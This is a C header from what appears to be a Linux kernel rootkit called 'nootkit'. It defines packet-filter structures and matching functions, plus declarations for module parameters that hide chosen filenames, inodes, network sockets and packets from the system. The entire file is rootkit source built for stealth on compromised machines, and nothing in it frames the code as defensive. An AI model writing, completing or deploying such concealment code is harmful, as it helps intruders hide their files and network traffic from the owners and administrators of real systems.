#pragma once

#include <linux/types.h>
#include <net/ip.h>

#define MAX_HIDE_ENTITIES (255)

extern const u8 ETH_ADDR_ZERO[6];

#define NOOTKIT_ETH_ALL 0
#define NOOTKIT_IP_ALL 0

struct config_netfilter {
    __be16 ethproto;
    u8 src_eth[6];
    u8 dst_eth[6];
    u8 ipproto;
    __be32 src_ip;
    __be32 src_ip_mask;
    __be32 dst_ip;
    __be32 dst_ip_mask;
    __be16 src_port_start;
    __be16 src_port_end;
    __be16 dst_port_start;
    __be16 dst_port_end;
};

static inline bool filter_eth(struct config_netfilter *filter,
    __be16 ethproto, u8 *src_eth, u8 *dst_eth)
{
    if (   (ethproto == filter->ethproto || filter->ethproto == NOOTKIT_ETH_ALL)
        && ((memcmp(src_eth, filter->src_eth, sizeof(filter->src_eth)) || memcmp(filter->src_eth, ETH_ADDR_ZERO, sizeof(filter->src_eth))))
        && ((memcmp(dst_eth, filter->dst_eth, sizeof(filter->dst_eth)) || memcmp(filter->dst_eth, ETH_ADDR_ZERO, sizeof(filter->dst_eth)))))
        return true;
    return false;
}

static inline bool filter_ip(struct config_netfilter *filter,
    u8 ipproto, __be32 src_ip, __be32 dst_ip)
{
    if (   (ipproto == filter->ipproto || filter->ipproto == NOOTKIT_IP_ALL)
        && ((src_ip & filter->src_ip_mask) == (filter->src_ip & filter->src_ip_mask))
        && ((dst_ip & filter->dst_ip_mask) == (filter->dst_ip & filter->dst_ip_mask)))
        return true;
    return false;
}

static inline bool filter_transport(struct config_netfilter *filter,
    __be16 src_port, __be16 dst_port)
{
    if (   (__be16_to_cpu(src_port) >= __be16_to_cpu(filter->src_port_start))
        && (__be16_to_cpu(src_port) <= __be16_to_cpu(filter->src_port_end))
        && (__be16_to_cpu(dst_port) >= __be16_to_cpu(filter->dst_port_start))
        && (__be16_to_cpu(dst_port) <= __be16_to_cpu(filter->dst_port_end)))
        return true;
    return false;
}

/// @brief Parse a connection description string (e.g. entered as a module parameter)
///     to a config_netfilter struct.
/// @param cs Packet filter description string.
/// @param res Pointer to a config_netfilter struct to fill with data.
/// @return 0 on success, non-zero on error.
int config_parse_packet_filter(char *cs, struct config_netfilter *res);

/// @brief Fill all config globals which require runtime parsing, e.g. hide_sockets
///     structs being filled from strings.
/// @returns 0 on success, or non-zero if at least one parse failed.
/// @attention In case of failure, config globals are left in an unstable state, and
///     should not be used.
int config_parse_globals(void);

/**
 * Defined in config.c
 */

extern struct config_netfilter hide_packets[MAX_HIDE_ENTITIES];
extern struct config_netfilter hide_sockets[MAX_HIDE_ENTITIES];

/**
 * Config globals that are defined in nootkit_main.c
 * as module parameters
 */

extern char *hide_filenames[MAX_HIDE_ENTITIES];
extern int hide_filenames_count;

extern unsigned long hide_inodes[MAX_HIDE_ENTITIES];
extern int hide_inodes_count;

extern char *hide_sockets_strs[MAX_HIDE_ENTITIES];
extern int hide_sockets_count;

extern char *hide_packets_strs[MAX_HIDE_ENTITIES];
extern int hide_packets_count;
